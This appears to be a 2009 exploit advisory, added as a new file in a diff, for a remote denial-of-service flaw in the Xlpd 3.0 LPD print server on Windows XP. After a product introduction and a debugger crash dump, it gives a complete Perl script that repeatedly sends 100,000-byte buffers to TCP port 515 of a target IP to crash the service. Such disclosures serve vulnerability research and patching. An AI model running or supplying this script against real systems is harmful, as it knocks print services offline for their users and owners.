@@ -1,0 +1,111 @@
+#######################################################################
+#############
+
+Application: XLPD 3.0 Remote DoS
+
+Platforms: Windows XP Professional SP2
+
+crash:	 YES
+
+Exploitation: remote DoS
+
+Date: 2009-10-06
+
+Author: Francis Provencher (Protek Research Lab's)
+
+########################################################################
+#############
+
+1) Introduction
+2) Technical details
+3) The Code
+
+########################################################################
+#############
+
+===============
+1) Introduction
+===============
+
+Xlpd is an LPD (Line Printer Daemon) application for MS Windows platforms. When applying Xlpd, your local PC with a printer becomes a print server where the
+
+print jobs from various remote systems are requested and processed in networked environment.
+
+Xlpd helps you print remote files locally without manually downloading them into your local computer. When you are connected to a remote UNIX/Linux system
+
+with Xmanager or Xshell program and want to print some data of the remote system, just enter print command on the terminal prompt.
+
+(www.netsarang.com)
+
+########################################################################
+#############
+
+============================
+2) Technical details 
+============================
+
+Xlpd 3.0 
+Build 0076
+Aug 30, 2009
+
+(774.d80): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=0012f77c ecx=fffff703 edx=000004fc esi=ffffffff edi=01390000
+eip=004031c5 esp=0138f468 ebp=00ff8ce0 iopl=0 nv up ei pl nz na pe nc
+cs=001b ss=0023 ds=0023 es=0023 fs=0038 gs=0000 efl=00010206
+
+########################################################################
+#############
+
+===========
+3) The Code
+===========
+
+Proof of concept DoS code;
+
+#!/usr/bin/perl
+
+########################################################################
+###########
+#
+# Software: XLPD 3.0 Remote DoS
+# Found By: Francis Provencher (Protek Research Lab's)
+# Tested On: Windows XPSP2
+# Usage: perl scriptname <Target IP>
+#
+########################################################################
+###########
+
+use Getopt::Std;
+use Socket;
+my $SOCKET = "";
+
+$loop = 51;
+$host = $ARGV[0];
+$port = 515;
+
+if (!defined $host){
+print "Host not defined.\n"
+}
+
+$str = "\x41" x 100000;
+
+$iaddr = inet_aton($host) || die "Unknown host: $host\n";
+$paddr = sockaddr_in($port, $iaddr) || die "getprotobyname: $!\n";
+$proto = getprotobyname('tcp') || die "getprotobyname: $!\n";
+
+for ($j=1;$j<$loop;$j++) {
+
+socket(SOCKET,PF_INET,SOCK_STREAM, $proto) || die "socket: $!\n";
+connect(SOCKET,$paddr) || die "Lost Conection: $! .........bye bye?\n";
+send(SOCKET,$str, 0) || die "failure sent: $!\n";
+print "\nSending string: ".$j;
+sleep(1);
+close SOCKET;
+sleep(1);
+}
+
+########################################################################
+#############
+(PRL-2009-10)
